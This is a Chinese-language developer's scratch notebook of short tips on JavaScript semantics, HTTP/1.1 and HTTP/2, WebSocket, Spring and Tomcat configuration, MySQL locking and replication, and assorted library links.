new Array(arrayLength) 方式构造的数组是一个稀疏数组，里面是没有任何值的，只有长度

Array(30).fill(4)
--------------------------------------------------------------------------------------
如果只匹配除abc,不要.jpg如何匹配：
'abc.jpg'.match(/\w+(?=\.\w+)/)[0]

如果只匹配.jpg，不要abc
'abc.jpg'.match(/(?!\w+)\.\w+/)[0]
--------------------------------------------------------------------------------------
var arr = [1, 2, 3];

console.log(
    arr.map(function(i){
        return i+i;
    })
    //链式风格
    .sort()
);// [2,4,6]
--------------------------------------------------------------------------------------
http://wkhtmltopdf.org/downloads.html html转pdf

--------------------------------------------------------------------------------------
上传 rz -be
-b, –binary 用binary的方式上传下载，不解释字符为ascii
-e, –escape 强制escape 所有控制字符，比如Ctrl+x，DEL等

sz -be files
--------------------------------------------------------------------------------------
https://github.com/nanosai/modrun
在运行时直接从Maven仓库加载和运行类，并解决相关依赖。可加载多个应用到同一个JVM中，
同时保持这些类完全隔离；能同时可加载同一目录的多个版本到JVM，甚至可在同一个应用中使用同样目录下多个版本类，
同时保持这些加载不同版本完全隔离，彻底终结了依赖冲突

--------------------------------------------------------------------------------------
https://github.com/coverity/coverity-security-library
Coverity 安全库（ CoveritySecurity Library ，简称 CSL ）是一个安全、轻量级、
方便免费的编码仓库，能够协助处理 HTML 和 SQL 动态数据
--------------------------------------------------------------------------------------
https://github.com/dtao/lazy.js js懒性计算
Lazy.js 只提供链式的、惰性求值的计算模式

收集计算需求
延迟并优化计算的执行过程

惰性求值就是： 对于一个表达式，在不需要值的时候不计算，需要的时候才计算
将求值的过程包装为函数，只在需要求值的时候才调用该函数
--------------------------------------------------------------------------------------
https://github.com/aadsm/jschardet js编码检测
--------------------------------------------------------------------------------------
HTTP/1.1 引入了 Upgrade 机制, 它使得客户端和服务端之间可以借助已有的 HTTP 语法升级到其它协议
请求头
Connection: Upgrade
Upgrade: protocol-name[/protocol-version]

服务端同意升级
HTTP/1.1 101 Switching Protocols
Connection: upgrade
Upgrade: protocol-name[/protocol-version]

客户端通过 Upgrade 头部字段列出所希望升级到的协议和版本，多个协议之间用英文逗号和空格（0x2C, 0x20）隔开

GET ws://example.com/ HTTP/1.1
Connection: Upgrade
Upgrade: websocket
Origin: http://example.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: d4egt7snxxxxxx2WcaMQlA==
Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits

HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: gczJQPmQ4Ixxxxxx6pZO8U7UbZs=
之后，客户端和服务端之间就可以使用 WebSocket 协议进行双向数据通讯

HTTP/1.1 到 HTTP/2 的协议升级
GET / HTTP/1.1
Host: example.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: <base64url encoding of HTTP/2 SETTINGS payload>

HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: h2c


--------------------------------------------------------------------------------------
WebSocket JavaScript API
if(window.WebSocket) {
	// WebSocket代码
  var ws = new WebSocket('ws://localhost:8327');
}

如果接收的是二进制数据，需要将连接对象的格式设为 blob 或 arraybuffer.
ws.binaryType = 'arraybuffer';
--------------------------------------------------------------------------------------
哑代理
在转发请求和回送服务器响应请求之后就认为这次事务结束了，等待连接断开
由于connection：keep-alive首部已经发送到服务器和客户端，双方都认为持久连接已经建立完成，
两边认为持久连接OK而中间的哑代理等待连接断开的情况
如果客户端再一次在这条连接上发送请求，请求就会在哑代理处停止,哑代理已经在等待连接关闭
导致浏览器一直处于挂起状态，直到客户端或服务器之中一个连接超时，关闭连接为止

一个变通的做法即是引入一个叫做 Proxy-Connection

哑代理只是单纯的转发请求，并不能进行解析处理、维持持久连接等其他工作，
聪明的代理可以解析接收到的报文同时可以维持持久连接
--------------------------------------------------------------------------------------
持久连接类型有两种：HTTP/1.0+的keep-alive和HTTP/1.1的persistent.
HTTP/1.1的持久连接默认是开启的，只有首部中包含connection：close，才会事务结束之后关闭连接

HTTP 1.1 还提供了在持久化连接基础上的一个性能优化特性：请求管道。它可以在一条连接上同时发起多个请求而不必等到前面的请求得到响应，降低网络的环回响应时间
使用请求管道有一些限制：
连接必须是持久的；
服务器必须按照请求的顺序返回；
浏览器必须能应对部分请求失败的情况，并重试；
不能进行非幂等这类可能带来副作用的请求，如 POST 请求，因为无法安全重试

要是用持久连接，那么就一定要有正确的content-length这个描述主体长度的首部
代理和网管必须再转发之前删除connection：keep-alive

--------------------------------------------------------------------------------------
垂直从右到左书写
.content {
    writing-mode: vertical-lr;
    direction: rtl;
}
--------------------------------------------------------------------------------------
//选择所有具有data-class属性的元素
var div = document.querySelectorAll("[data-class]");
//选择所有data-class属性值为my的元素
var div = document.querySelectorAll("[data-class='my']");

div[data-class="my"]{
        box-shadow: 0 0 5px 5px #CCCCCC;
}
--------------------------------------------------------------------------------------
https://github.com/dollarshaveclub/shave js多行文本截断适应最大宽度
--------------------------------------------------------------------------------------
恢复服务的时间（通常被称为“平均恢复时间”，Mean Time to Recovery，MTTR)
--------------------------------------------------------------------------------------
Java中报java.lang.NoSuchMethodError: java.util.concurrent.ConcurrentHashMap.keySet()
开发人员在本地使用的JDK版本为1.8，但生产环境中使用的JDK版本为1.7，
Maven里，添加了source和target的级别都为1.7

在编译的时候，指定bootclasspath为1.7
javac -source 1.7 -target 1.7 HelloCovariance.java -bootclasspath
/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/rt.jar
--------------------------------------------------------------------------------------
Comparison method violates its general contract
强制将long转换为int，导致溢出。从而不满足比较器的传递性
举个例子，无溢出情况下，a > b return positive, b > c return positive,
但当a - c 溢出了，a > c return negative
--------------------------------------------------------------------------------------
SpringMVC 提供的 Filter 类简介
请求前后执行日志写入操作 -- AbstractRequestLoggingFilter
protected abstract void beforeRequest(HttpServletRequest request, String message);
protected abstract void afterRequest(HttpServletRequest request, String message);

继承
CommonsRequestLoggingFilter -- 在过滤前后分别打印出一段debug的信息
ServletContextRequestLoggingFilter -- 在过滤前后分别向日志文件中写入一段日志信息

HTTP method 修改操作 -- HiddenHttpMethodFilter
将指定的请求转换为标准的 http 方法，从而支持 GET、POST、PUT、DELETE 等请求
<filter>
    <filter-name>HiddenHttpMethodFilter</filter-name>
    <filter-class>org.springframework.web.filter.HiddenHttpMethodFilter</filter-class>
    <init-param>
        <param-name>methodParam</param-name>
        <param-value>_method_</param-value>
    </init-param>
</filter>
<filter-mapping>
	<filter-name>HiddenHttpMethodFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
在页面的 form 表单中设置为 method 为 Post
<input type="hidden" name="_method_" value="put"/>

通过复写父类 OncePerRequestFilter 的 doFilterInternal 方法实现的

HTTP method 更改为 PUT -- HttpPutFormContentFilter
HttpPutFormContentFilter 只处理 method 设置为 put 且 enctype 值为 application/x-www-form-urlencoded 的表单
<form action="" method="put" enctype="application/x-www-form-urlencoded">

Web 资源关联记号 ETag 的支持 -- ShallowEtagHeaderFilter
ETag 指的是被请求变量的实体值，是一个可以与Web资源关联的记号
每次服务器端响应一个请求都会在响应 Header 中添加 ETag 值：
ETag:"50b1c1d4f775c61:df3"
客户端在下一次请求时可以将上一次请求所收到的 ETag 值加入到请求 Header 中：
If-None-Match : W / "50b1c1d4f775c61:df3"
如果 ETag 值没有变，那么就直接返回 304 状态，而不返回 body
使用 ETag 对节约带宽效果是很好的，但是由于每次都要计算 ETag，所以服务器性能并没有任何提升

--------------------------------------------------------------------------------------
tomcat 启动报错处理
在项目 WEB-INF 目录下创建 classes 目录，在 classes 目录中创建 logging.properties 文件
handlers = org.apache.juli.FileHandler, java.util.logging.ConsoleHandler

############################################################
# Handler specific properties.
# Describes specific configuration info for Handlers.
############################################################

org.apache.juli.FileHandler.level = FINE
org.apache.juli.FileHandler.directory = /opt/logs/springtest
org.apache.juli.FileHandler.prefix = error-debug.

java.util.logging.ConsoleHandler.level = FINE
java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter
--------------------------------------------------------------------------------------
public int normalizeTicksPerWheel(int ticksPerWheel) {
		// 这里参考java8 hashmap的算法，使推算的过程固定
		int n = ticksPerWheel - 1;//防止已经是2的幂
		n |= n >>> 1;//或运算只要有一个是1 结果为1
		n |= n >>> 2;
		n |= n >>> 4;
		n |= n >>> 8;
		n |= n >>> 16;
		// 这里1073741824 = 2^30,防止溢出
		return (n < 0) ? 1 : (n >= 1073741824) ? 1073741824 : n + 1;
	}
--------------------------------------------------------------------------------------
static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
key的hash值高16位不变，低16位与高16位异或作为key的最终hash值
h >>> 16，表示无符号右移16位，高位补0，任何数跟0异或都是其本身，因此key的hash值高16位不变
--------------------------------------------------------------------------------------
mysql
supremum pseudo-record，简单说就是正无穷
先根据c_id删除现有数据，再插入新数据。这个时候很容易出现死锁

max(c_id)=5
delete from business where c_id = 6; 事务1：Gap锁，锁住区域(5, +∞)
delete from business where c_id = 7; 事务2：Gap锁，锁住区域(5, +∞)
insert into 插入意向锁(Insert Intention Lock)，期望获取(5, 6)这个Gap锁和一个c_id=6的Recored锁。
但是因为 事务2 已经锁住了区域(5, +∞)因此这时候，事务1只能等待 事务2 释放锁.

事务2：insert into 等待获取事务1的锁
出现循环等待，死锁

插入意向锁
锁的类型：Gap Lock
加锁时间：插入之前
锁的区域：待插入的区域，比如已有数据4,7，想要插入5，就会锁住(4, 7)这个区域
锁的冲突：只要两个插入的数据不在同一个位置(其实可以理解为同一个数据)，插入意向锁之间就不会冲突

插入之前会加一把插入意向锁，除此之外，会在插入的记录上加一把锁
Gap锁的作用是只防止其他事务在这个Gap内的插入，而不排斥其他事务在同一个Gap加上Gap锁。因此Gap X锁和Gap S锁效果相同

解决
先根据 c_id 查询id，根据 id 删除;
其实只要保证数据存在再删除就没问题
--------------------------------------------------------------------------------------
function Foo() {
    --函数赋值语句
    getName = function () { console.log (1); };
    return this;
}
Foo.getName = function () { console.log (2);};
Foo.prototype.getName = function () { console.log (3);};
var getName = function () { console.log (4);};
function getName() { console.log (5);}

Foo.getName();//2 ---访问Foo函数上存储的静态属性
getName();//4 ---是访问当前上文作用域内的叫getName的函数 一是变量声明提升，二是函数表达式
Foo().getName();//1 --先执行了Foo函数，然后调用Foo函数的返回值对象的getName属性函数
先向当前Foo函数作用域内寻找getName变量，没有。再向当前函数作用域上层，即外层作用域内寻找是否含有getName变量，
找到了，也就是第二问中的log(4)函数，将此变量的值赋值为 function(){log(1)}
this的指向是由所在函数的调用方式决定的 Foo函数返回的是window对象

getName();//1
new Foo.getName();//2 --js的运算符优先级问题 （.）的优先级高于new操作 new (Foo.getName)();
new Foo().getName();//3 括号高于new (new Foo()).getName()
返回值是引用类型，则实际返回值为这个引用类型
this在构造函数中本来就代表当前实例化对象，遂最终Foo函数返回实例化对象 调用实例化对象的getName函数

new new Foo().getName();//3  new ((new Foo()).getName)();
先初始化Foo的实例化对象，然后将其原型上的getName函数作为构造函数再次new
成员访问的优先级是最高的 先执行了 .getName 左侧执行了 new Foo()

--------------------------------------------------------------------------------------
var v='Hello World';
(function(){
    console.log(v); --Hello
})();

var v='Hello World';
(function(){
    console.log(v); --undefined
    var v='I love you';
})()
变量提升 只是提升变量的声明
只有函数声明形式才能被提升
function myTest(){
    foo();
    function foo(){
        console.log("我来自 foo");
    }
}
myTest();
--------------------------------------------------------------------------------------
hasOwnProperty 是 JavaScript 中唯一一个处理属性但是不查找原型链的函数
JavaScript 不会保护 hasOwnProperty 被非法占用，因此如果一个对象碰巧存在这个属性，
就需要使用外部的 hasOwnProperty 函数来获取正确的结果。
var foo = {
    hasOwnProperty: function() {
        return false;
    },
    bar: 'Here be dragons'
};

foo.hasOwnProperty('bar'); // 总是返回 false
// 使用其它对象的 hasOwnProperty，并将其上下文设置为foo
({}).hasOwnProperty.call(foo, 'bar'); // true
--------------------------------------------------------------------------------------
清除所有定时器
// 清空"所有"的定时器
for(var i = 1; i < 1000; i++) {
    clearTimeout(i);
}
--------------------------------------------------------------------------------------
变量声明和函数声明都会得到变量提升，但函数声明会最先得到提升，然后是变量声明
foo();    //输出的结果为1
var foo;
function foo(){
    console.log(1);
}
foo = function(){
    console.log(2);
}

console.log(x);//输出：function x(){}
var x=1;
function x(){}
--------------------------------------------------------------------------------------
Array.prototype.push.apply(arr1, arr2)
不是用来创建一个新的数组，其只是将第一个第二个数组合并在一起，同时减少内存的使用
--------------------------------------------------------------------------------------
console.log(+0 === -0); //true
console.log(NaN === NaN); //false
console.log(Object.is(+0, -0)); //false
console.log(Object.is(NaN, NaN)); //true
--------------------------------------------------------------------------------------
http://www.chinaxing.org/ 支持各式各样的图片滑动，移动端和PC端都支持
--------------------------------------------------------------------------------------
tomcat maxPostSize默认值2M
<Connector port="8081" maxPostSize="0"/> 设置为0表示没有限制
--------------------------------------------------------------------------------------
yield语句是Generator函数内部可以暂停执行程序的语句，yield语句后面的值可以是各种数据类型，字符串，整数，布尔值等
当碰到return语句时，返回对象的done属性值就为true，遍历结束，不管后面是否还有yield或者return语句
yield语句具备位置记忆功能而return语句则没有该功能
调用函数时都不会执行任何语句，只有当调用next(),内部语句才会执行，只要调用next()，就会返回一个对象。
yield语句只是函数暂停执行的一个标记

function* gen4(a) {
    let b = yield (a + 1);
    return b * 2;
}
let g4 = gen4(1);
g4.next();  //  Object {value: 2, done: false}
g4.next();  //  Object {value: NaN, done: true}
let g5 = gen4(1);
g5.next();  //  Object {value: 2, done: false}
g5.next(3);  //  Object {value: 6, done: true}
yield语句没有返回值，或者总是返回undefined；
next方法如果带上一个参数，这个参数就是作为上一个yield语句的返回值。
--------------------------------------------------------------------------------------
function* gen5() {}
gen5.prototype.say = function() {
    console.log('有generator?');
}
let g6 = gen5();
g6.say();  // 有generator?

function* gen6() {
    this.a = 1;
}
let g7 = gen6();
g7.a;  //  undefined
http://es6.ruanyifeng.com/#docs/generator
--------------------------------------------------------------------------------------
SSE 是 HTML5 的 Server-Sent Events缩写，服务器端发送的事件 网页自动获取服务器端的数据更新
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000007707209 截图插件
--------------------------------------------------------------------------------------
未定义值:
undefined: void 0
--------------------------------------------------------------------------------------
classpath文件
1.<classpathentry kind="src" path="src"/>：指定source folder类型的目录，
kind="src"表示这个classpath的类型，path表示在项目中的路径，path使用根目录的相对路径(相对.classpath文件本身的相对路径)
2、<classpathentry kind="con" path="org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.6">：
指定程序的JRE运行环境，kind="con"表示classpath的类型，con即是container,就是程序运行的容器，或者就说是运行环境
3、<classpathentry kind="con" path="org.eclipse.jst.j2ee.internal.web.container"/>：
指定程序运行时的容器，一般情况下是java web项目才会有，它是包含了J2EE服务器要使用到的一些jar包， 这句是kind="con"当然和上条一样，是表示运行时的容器
4.<classpathentry kind="lib" path="WebRoot/WEB-INF/lib/bsf-2.3.0.jar"/>：
指定第三方jar包加载的路径，kind="lib"表示classpath中的库文件，path指定库文件的路径，同样是相对与项目根目录的相对路径
5、<classpathentry kind="output" path="WebRoot/WEB-INF/classes"/>：
指定项目的编译输出目录，在java web中也就是WebRoot/WEB-INF/classes，同样使用的path是相对项目根目录的相对路径
(相对.classpath文件本身的相对路径)
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000007720639 api文档编写
--------------------------------------------------------------------------------------
https://github.com/benjaminwhx/java-testcase-example
--------------------------------------------------------------------------------------
https://github.com/SonarSource/sonar-custom-rules-examples/blob/master/java-custom-rules/pom.xml
--------------------------------------------------------------------------------------
redis 4
LFU(Least Frequently Used)，对最不常用的缓存数据进行清理
新增非阻塞删除命令 UNLINK，先删除一个key的引用，然后在一个单独线程中执行真正的删除
改进主从复制策略 引入了 tag 标签，对于每次复制，都由 标签+偏移量 来定义
当某一个slave变为master之后，还可以通过 标签+偏移量 来使用 PSYNC 进行部分重新复制

新增内存命令:
MEMORY 命令可以让我们更清晰的了解内存状况，如：
查看某个key的内存使用
查看内存使用细节
申请释放内存
深入查看内存分配的内部状态

--------------------------------------------------------------------------------------
通过重定向到 Null 来清空文件内容 > access.log
: 符号，它是 shell 的一个内置命令，等同于 true 命令，它可被用来作为一个 no-op（即不进行任何操作）
: > access.log
true > access.log

cat /dev/null > access.log

echo "" > access.log
echo > access.log

使用 truncate 命令来清空文件内容
truncate -s 0 access.log -s 参数来特别指定文件的大小
--------------------------------------------------------------------------------------
https://github.com/mokies/ratelimitj
--------------------------------------------------------------------------------------
https://github.com/danfengcao/binlog2sql python解析mysql bin恢复数据
--------------------------------------------------------------------------------------
http://mp.weixin.qq.com/s/qIvce6p1SOJRhNdXMmJM5A
tomcat conf/catalina.properties
common.loader=${catalina.base}/lib,${catalina.base}/lib/*.jar,${catalina.home}/lib,${catalina.home}/lib/*.jar
对于目录结尾的，视为class文件的加载路径，对于目录/*.jar结尾的，则视为目录下所有jar会被加载
<Context>
 <Loader className="" delegate="true"/> 父优先还是子优先
</Context>
       Bootstrap
          |
       System
          |
       Common
       /     \
  Webapp1   Webapp2
在Eclipse里，Tomcat的执行是通过指定不同的catalina.base
--------------------------------------------------------------------------------------
HTTP/2基于SPDY3，专注于性能
HTTP/2由两个规范（Specification）组成：
Hypertext Transfer Protocol version 2 - RFC7540 超文本传输
HPACK - Header Compression for HTTP/2 - RFC7541

HTTP/1.x的缺陷
1连接无法复用 每次请求都经历三次握手和慢启动
2Head-Of-Line Blocking：导致带宽无法被充分利用，以及后续健康请求被阻塞。
HOLB是指一系列包（package）因为第一个包被阻塞；HTTP/1.x中，由于服务器必须按接受请求的顺序发送响应的规则限制
，那么假设浏览器在一个（tcp）连接上发送了两个请求，那么服务器必须等第一个请求响应完毕才能发送第二个响应——HOLB
解决HOLB的Domain Sharding（域名分片）
3协议开销大：HTTP/1.x中header内容过大

http2
1.新的二进制格式（Binary Format）
length定义了整个frame的大小，type定义frame的类型（一共10种），
flags用bit位定义一些重要的参数，stream id用作流控制，payload就是request的正文
2.Header压缩 encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表
3.流（stream）和多路复用（MultiPlexing）  连接共享

--------------------------------------------------------------------------------------
ie edge
var csvContent=data; //here we load our csv data
var blob = new Blob([csvContent],{
    type: "text/csv;charset=utf-8;"
});

navigator.msSaveBlob(blob, "filename.csv")

<a href='data:text/csv;charset=utf-8,xxxxxxx' download='y.csv'>
var str = "栏位1,栏位2,栏位3\n值1,值2,值3";
str =  encodeURIComponent(str);
aLink.href = "data:text/csv;charset=utf-8,\ufeff"+str;
aLink.click();
BOM头 \ufeff

data = "\ufeff"+data;
var blob = new Blob([data], { type: 'text/csv,charset=UTF-8'});
var csvUrl = URL.createObjectURL(blob);
document.getElementById("mylink").href = csvUrl;

_getDownloadUrl: function(text) {
    var BOM = "\uFEFF";
    // Add BOM to text for open in excel correctly
    if (window.Blob && window.URL && window.URL.createObjectURL) {
        var csvData = new Blob([BOM + text], { type: 'text/csv' });
        return URL.createObjectURL(csvData);
        } else {
            return 'data:attachment/csv;charset=utf-8,' + BOM + encodeURIComponent(text);
        }
    },

https://github.com/jmaister/excellentexport 国外的导出cvs
"\uFEFF"+base64(csvData);
--------------------------------------------------------------------------------------
oracle 的 rac+dataguard同步集群
--------------------------------------------------------------------------------------
https://github.com/kimmobrunfeldt/progressbar.js js进度条
--------------------------------------------------------------------------------------
var obj3 = {
    name: 'xiaoming',
    age: 23
};

var newObj3 = Object.create(obj3);

newObj3.name = 'xiaohua';

console.log(obj3.name); // 'xiaoming'
console.log(newObj3.name); // 'xiaohua'
Object.create()方法可以创建一个具有指定原型对象和属性的新对象。

Object.assign() 只是一级属性复制
var obj2 = {
    name: 'xiaoming',
    age: 23
};
var newObj2 = Object.assign({}, obj2, {color: 'blue'});
--------------------------------------------------------------------------------------
https://date-fns.org/docs/format js格式时间
--------------------------------------------------------------------------------------
let s = Symbol();
console.log(s);  // Symbol()
typeof s;  // "symbol"

let s1 = Symbol('s1');
let s2 = Symbol('s2');
console.log(s1);  // Symbol(s1)
console.log(s2);  // Symbol(s2)
s1 === s2;  //  false
let s3 = Symbol('s2');
s2 === s3;  //  false
给Symbol函数加了参数之后，控制台输出的时候可以区分到底是哪一个值；
Symbol函数的参数只是对当前Symbol值的描述，因此相同参数的Symbol函数返回值是不相等的；

Symbol值可以显式转化为字符串和布尔值，但是不能转为数值

用Object.getOwnPropertySymbols()方法获取一个对象上的Symbol属性名。
使用Reflect.ownKeys()返回所有类型的属性名，包括常规属性名和 Symbol属性名
let s5 = Symbol('s5');
let s6 = Symbol('s6');
let a = {
    [s5]: 's5',
    [s6]: 's6'
}
Object.getOwnPropertySymbols(a);   // [Symbol(s5), Symbol(s6)]
a.hello = 'hello';
Reflect.ownKeys(a);  //  ["hello", Symbol(s5), Symbol(s6)]

Symbol.for()函数也可以用来生成Symbol值，但该函数有一个特殊的用处，就是可以重复使用一个Symbol值
let s7 = Symbol.for('s7');
console.log(s7); // Symbol(s7)
s7.toString(); // "Symbol(s7)"
let s8 = Symbol.for('s8');
s7 === s8 //  true
let s9 = Symbol();
Symbol.keyFor(s9); // undefined
Symbol.keyFor(s8); // "s8"

Symbol.for()函数要接受一个字符串作为参数，先搜索有没有以该参数作为名称的Symbol值，
如果有，就直接返回这个Symbol值，否则就新建并返回一个以该字符串为名称的Symbol值
Symbol.keyFor()函数可以查找到用Symbol.for()函数生成的Symbol值

--------------------------------------------------------------------------------------
status = loadPayRecord(id);
update pay_record set status = 'doing' where status == 'init';
if (updateNum == 0)
    return;
--------------------------------------------------------------------------------------
java 8 使用Nashorn
jjs
print('Hello World');
--------------------------------------------------------------------------------------
mysql
链式复制（多级复制）
M---S1---S2/S3，S1是S2/S3的主，主库只需要给S1推送binlog日志即可，
S1再推送binlog日志给S2/S3，在这种场景下，缓解了主库的网络IO压力，
缺点是：S2/S3得到最新的数据，需要再经过一层的复制才到达，期间的延迟比一主多从架构要大

--------------------------------------------------------------------------------------
Mysql blackhole(黑洞引擎)
blackHole ：黑洞引擎，写入的任何数据都会消失，用于记录binlog做复制的中继存储
show variables like 'have%';

创建一个BLACKHOLE表的时候，服务器在数据库目录创建一个表定义文件。
文件用表的名字开头，并且有一个.frm扩展名。没有其它文件关联到这个表格
create table test(i int, val char(10)) engine = blackhole;

blackhole存储引擎的表不存储任何数据，但如果mysql启用了二进制日志，sql语句被写入日志
使用blackhole存储引擎的mysqld可以作为主从复制中的中继重复器

--------------------------------------------------------------------------------------
mysql_config_editor set --login-path=test --user=root --password --host=localhost
mysql --login-path=test

mysql_config_editor print --all
mysql_config_editor print --login-path=test
mysql_config_editor remove --login-path=test
--------------------------------------------------------------------------------------
grant all privileges on *.* to root@localhost identified by 'Mima';
flush privileges;
--------------------------------------------------------------------------------------
应该用prop()获取的属性如下：async,autofocus,checked,location,multiple,readOnly,selected
--------------------------------------------------------------------------------------
html5
let input = document.querySelector('input[type="text"]');

element = document.querySelector('selectors');
elementList = document.querySelectorAll('selectors');

element = document.querySelector('.foo\\:bar'); 转义:
--------------------------------------------------------------------------------------
js中的对象是基于哈希表结构的
Object.create(null)的方式来创建一个完全空白、无原型的空对象

function arrayUnique(target) {
  var result = [target[0]];
  var temp = {};
  temp[target[0]] = true;
  for (var i = 1, targetLen = target.length; i < targetLen; i++) {
    if (typeof temp[target[i]] === 'undefined') {
      result.push(target[i]);
      temp[target[i]] = true;
    }
  }
  return result;
}
问题
var temp = {};
自带了一个__proto__属性，如果你的目标数组里面恰好有"__proto__"这个值
--------------------------------------------------------------------------------------
setInterval在执行完一次代码之后，经过了那个固定的时间间隔，它还会自动重复执行代码，
setTimeout只执行一次那段代码
--------------------------------------------------------------------------------------
http via
Via	通知中间网关或代理服务器地址，通信协议	Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)

CDN的优势很明显：
1 CDN节点解决了跨运营商和跨地域访问的问题，访问延时大大降低；
2 大部分请求在CDN边缘节点完成，CDN起到了分流作用，减轻了源站的负载

缺点
当网站更新时，如果CDN节点上数据没有及时更新

CDN节点向源站请求数据的行为就叫做回源

--------------------------------------------------------------------------------------
eclipse中有一个配置文件叫org.eclipse.wst.common.project.facet.core.xml负责项目特性的持久配置。
在package explorer视图下看不见，切换到navigator视图，在.settings文件夹下才能找到
--------------------------------------------------------------------------------------
https://github.com/markmalek/Fixed-Header-Table js表头固定
$(document).ready(function(){
		 var thhead=$(".fht-fixed-column .fht-thead th");
		 var thbody=$(".fht-fixed-column .fht-tbody tr:eq(0) td");

		 for(i=0;i<thhead.length;i++)
		 {
		   if(thhead.eq(i).width()<thbody.eq(i).width()){
			thhead.eq(i).width(thbody.eq(i).width());
		   }else{
		    thbody.eq(i).width(thhead.eq(i).width());
		   }
		 }

});
--------------------------------------------------------------------------------------
mysql
binlog_row_image 参数默认值是FULL，其还有一个值是minimal
full记录每一行的变更，minimal只记录影响后的行
--------------------------------------------------------------------------------------
UTF-8 可变字节序列，用1到4个字节表示一个码点
UTF-16 可变字节序列，用2或4个字节表示一个码点
UTF-32 固定字节序列，用4个字节表示一个码点
UTF-16对于BMP的码点，采用2个字节进行编码，而BMP之外的码点，用4个字节组成代理对（surrogate pair）来表示

ES6的Array.from支持代理对的解析
function reverse(string) {
  return Array.from(string).reverse().join('');
}

https://github.com/mathiasbynens/esrever Unicode-aware string reverser
--------------------------------------------------------------------------------------
jquery的append可以做到注入
因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍
--------------------------------------------------------------------------------------
[] == ![]; true
1 [] == ![]
2 [] == false
3 Number([]) == false
4 0 == false
--------------------------------------------------------------------------------------
HTTP 451 因法律原因不可用
--------------------------------------------------------------------------------------
idea 创建maven项目缓慢的问题
使用本地catalog文件，在idea中设置archetype的使用方式为local;
-DarchetypeCatalog=local

http://repo1.maven.org/maven2/archetype-catalog.xml
把下载的文件放到%userprofile%/.m2目录下即可
--------------------------------------------------------------------------------------
cglib
被代理类中的final方法，无法进行代理，因为子类中无法重写final函数

通过字节码技术为一个类创建子类，并在子类中采用方法拦截的技术拦截所有父类方法的调用
--------------------------------------------------------------------------------------
实现最终一致性有三种模式：可靠事件模式、业务补偿模式、TCC模式
可靠事件模式在于保证可靠事件投递和避免重复消费

分布式事务，常见的两个处理办法就是两段式提交和补偿
--------------------------------------------------------------------------------------
someselecttor:last-chid 所表示的是，如果someselecttor所选中的某个节点恰好是其父元素的最后一个直接子节点
，那么该选择器生效。而不是表示someselecttor选中的节点集合的最后一个

someselecttor:first-chid 所表示的是如果someselecttor所选中的某个节点恰好是其父元素的第一个直接子节点，
那么该选择器生效
--------------------------------------------------------------------------------------
唯一理论上两阶段提交出现问题的情况是当协调者发出提交指令后当机并出现磁盘故障等永久性错误，导致事务不可追踪和恢复
--------------------------------------------------------------------------------------
XA协议采用两阶段提交方式来管理分布式事务。XA接口提供资源管理器与事务管理器之间进行通信的标准接口。
XA协议包括两套函数，以xa_开头的及以ax_开头的
--------------------------------------------------------------------------------------
刚性分布式事务一致性解决方案
2PC（两阶段提交协议）
MVCC（多版本控制并发）
异步确保：通过将同步阻塞操作变成异步操作，从而避免资源竞争来减少同时修改一份数据的概率来减少一致性问题。这种策略只是一种优化，并不能完全解决一致性问题，只是降低一致性问题出现的概率。
采用paxos协议，来保证修改操作的一致性。

--------------------------------------------------------------------------------------

箭头函数中的this关键字，指向的是定义时的对象，而不是使用时的对象
--------------------------------------------------------------------------------------
var x=1;
if(function f(){}){
  x += typeof f;
}
console.log(x)
在运算符中的函数声明在执行阶段是找不到的
--------------------------------------------------------------------------------------
function f(){
        return f;
   }
new f() instanceof f;
false

f中没有return f,则答案明显为true;而在本题中new f()其返回的结果为f的函数对象，其并不是f的一个实例
--------------------------------------------------------------------------------------
https://segmentfault.com/a/1190000007782683
--------------------------------------------------------------------------------------
no-cache 也会缓存数据到本地

Cache-Control: no-cache 等于 Cache-Control: max-age=0，
Cache-Control: max-age=0 又可分解成：
Cache-Control: public/private （不确定是二者中的哪一个）
Expires: 当前时间

在没有提供任何浏览器缓存过期策略的情况下，浏览器遵循一个启发式缓存过期策略：
根据响应头中2个时间字段 Date 和 Last-Modified 之间的时间差值，取其值的10%作为缓存时间周期

--------------------------------------------------------------------------------------
setTimeout(function(){
    // do something

    setTimeout(arguments.callee, interval);
}, interval)

使用定时器分隔循环，是一种叫作 数组分块(array chunking) 的技术
array 变量本质上就是一个 “代办事项” 列表，它包含了要处理的项目，
而 shift() 可以获取队列中下一个要处理的项目，然后将其传递个某个函数。
当队列中还剩下其它项目时，则设置另一个定时器，并通过 arguments.callee 调用同一个匿名函数。
function chunk(array, process, context){
    setTimeout(function(){
        var item = array.shift()
        process.call(context, item)

        if(array.length > 0){
            setTimeout(arguments.callee, 100)
        }
    }, 100)
}

var data = [12,124,343,56,76767,43,654,34645,56456,767,4645]
function printValue(item){
    var div = $('#block').html()
    $('#block').html(div + item + '<br>')
}

chunk(data, printValue)

--------------------------------------------------------------------------------------
http://ecomfe.github.io/zrender/  MVC核心封装实现图形仓库、视图渲染和交互控制
--------------------------------------------------------------------------------------
MySQL 5.6.24才引入的功能，新增了一个 avoid_temporal_upgrade 选项，其作用是让我们能选择是否强制升级表结构
--------------------------------------------------------------------------------------
[101,2,5,100].sort() 默认排序规则是数组元素 字符 的 Unicode 编码排序的
// [ 100, 101, 2, 5 ]

[101,2,5,100].sort((a, b) => a - b)
//[2, 5, 100, 101]

给定一个List(数组)， 元素都是正整数， 要求返回这些元素组成的最大数；
如[5, 2, 31, 3]则返回53312；
讲数组进行排序
